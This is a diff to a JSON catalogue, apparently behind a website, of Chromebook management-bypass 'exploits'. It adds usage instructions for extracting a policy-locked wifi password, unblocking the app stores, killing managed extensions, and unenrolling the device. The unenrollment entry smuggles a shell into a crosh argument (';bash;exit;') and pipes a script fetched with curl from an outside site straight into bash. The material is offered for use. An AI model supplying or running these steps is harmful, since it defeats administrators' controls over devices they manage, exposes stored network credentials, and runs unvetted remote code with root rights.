@@ -62,54 +62,51 @@
         "title": "Wifi Password",
         "description": "A method to get access to the wifi password of a policy locked wifi network.",
         "image": "/images/wifipassword.png",
+        "instructions": "1. Go to chrome://net-export and click select raw bytes and start logging, go to chrome://policy reload policies and wait for it to finish | 2. Go to chrome://net-exports and hit stop recording. | 3. Go to /wifipass and upload the log there.",
         "rating": "3"
     },
     {
         "title": "AddSession",
         "description": "An exploit that allows you to add a personal account to websites like Gmail or YouTube",
         "image": "/images/addsession.png",
+        "instructions": "1. Go to chrome://settings/signOut | 2. Clear your cookies on google.com. | 3. Then go to tinyurl.com/addsession to add an account",
         "rating": "2"
     },
     {
         "title": "PlaystoreBypass",
         "description": "An exploit that allows you to gain access to a completely unblocked PlayStore",
         "image": "/images/playstorebypass.png",
+        "instructions": "1. Downgrade | 2. Open Playstore downloads, open settings, click on Apps, and then the arrow to Manage Android Preferences | 3. Click on accounts and add personal account. | 4. Open playstore and click on 3 lines on the top left corner. Select the account you just added.",
         "rating": "3"
     },
     {
         "title": "WebstoreBypass",
         "description": "An exploit that allows you to gain access to a completely unblocked Webstore."   ,
         "image": "/images/webstorebypass.png",
+        "instructions": "1. Downgrade | 2. Add a personal Gmail account, if it is blocked use addession. | 3. Go to https://chrome.google.com/webstore/category/extensions?hl=en&gl=US&authuser=1 and navigate to Webstore.",
         "rating": "3"
     },
     {
         "title": "ExtensionKill",
         "description": "An exploit that will kick the desired extension off the device for around 3 seconds",
         "image": "/images/extensionkill.png",
+        "instructions": "1. Go to chrome-extension://extensionid/_generated_background_page.html | 2. Make a bookmarklet with the url chrome://kill | 3. Run it on the page and your extension will be killed for 3 seconds.",
+        "code": "chrome://kill",
         "rating": "2"
     },
     {
         "title": "Unenrollment",
         "description": "An exploit that will allow you to unenroll your chromebook completely.",
+        "instructions": "DISCLAIMER DO NOT DO THIS UNLESS YOU HAVE ADVANCED KNOWLEDGE OF CHROMEOS * UnEnroll: 1. Open Crosh & Type in set_cellular_ppp \\';bash;exit;\\' and enter | 2. Type in bash <(curl https://coolelectronics.me/unroll) and enter | 3. Wait for the script to finish and then powerwash chromebook. ReEnroll: 1. Enable DevMode (ESC+POWER+RELOAD, Ctrl D and enter on recovery screen) | 2. When in chrome, Open Crosh (ctrl + alt + t) | 3. Type in Shell & Type in sudo vpd i RW_VPD -s check_enrollment=1 | 4. Powerwash Again ",
+        "code": "set_cellular_ppp \\';bash;exit;\\'\n bash <(curl https://coolelectronics.me/unroll)\n Shell\n sudo vpd i RW_VPD -s check_enrollment=1",
         "image": "/images/unenrollment.png",
         "rating": "5"
     },
     {
         "title": "Incognito",
         "description": "An exploit that will allow you to gain access to Incognito mode. Works on versions v81 and under.",
+        "instructions": " getting on the login screen to the part where you are signing in as a new user. Enter your email and password but don't login. Do Alt + Shift + I. Continue to Step 1 where you spam Privacy Policy | 2. Spam Privacy Policy for a minute to 30 seconds until it is laggy | 3. Once you login go to the Incognito Tab and do Ctrl + Shift + N | 4. Do the Switch/Desktop View key and close original Incognito Tab | 4. If it continues to open policy pages, repeat part 3.",
         "image": "/images/incognito.png",
-        "rating": "3"
-    },
-    {
-        "title": "LTWEEF",
-        "description": "An exploit that will allow you to disable managed extensions on your chromebook post v106.",
-        "image": "/images/ltbeef.png",
-        "rating": "4"
-    }, 
-    {
-        "title": "PolicyBlockBypass",
-        "description": "An exploit that will allow you to unblock policy blocked urls.",
-        "image": "/images/policyblockbypass.png",
         "rating": "3"
     }
 ]
